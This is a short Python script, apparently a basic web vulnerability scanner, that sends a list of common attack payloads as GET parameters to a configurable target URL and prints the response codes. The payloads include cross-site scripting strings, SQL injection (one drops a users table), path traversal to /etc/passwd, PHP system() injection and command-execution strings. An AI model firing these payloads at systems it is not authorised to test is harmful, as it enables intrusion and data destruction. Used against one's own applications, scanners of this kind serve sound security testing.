import requests

# Target URL
TARGET_URL = "http://localhost"  # Change to your target

# Common attack vectors
attack_vectors = {
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
    ],
    "SQLi": [
        "1' OR '1'='1",
        "admin' --",
        "'; DROP TABLE users; --"
    ],
    "LFI": [
        "../../etc/passwd",
        "/etc/passwd",
    ],
    "RCE": [
        "eval(base64_decode('cGF5bG9hZA=='))",
        "`ls -la`"
    ],
    "PHP Injection": [
        "<?php system('ls'); ?>",
    ],
    "Null Byte": [
        "%00",
    ]
}

def test_vector(param_name="param"):
    print(f"Testing {TARGET_URL} with common attack vectors...\n")
    for category, payloads in attack_vectors.items():
        print(f"=== {category} ===")
        for payload in payloads:
            try:
                resp = requests.get(TARGET_URL, params={param_name: payload}, timeout=5)
                status = resp.status_code
                print(f"Payload: {payload}\nStatus: {status}\n")
            except Exception as e:
                print(f"Error sending payload {payload}: {e}")
        print()

if __name__ == "__main__":
    test_vector()
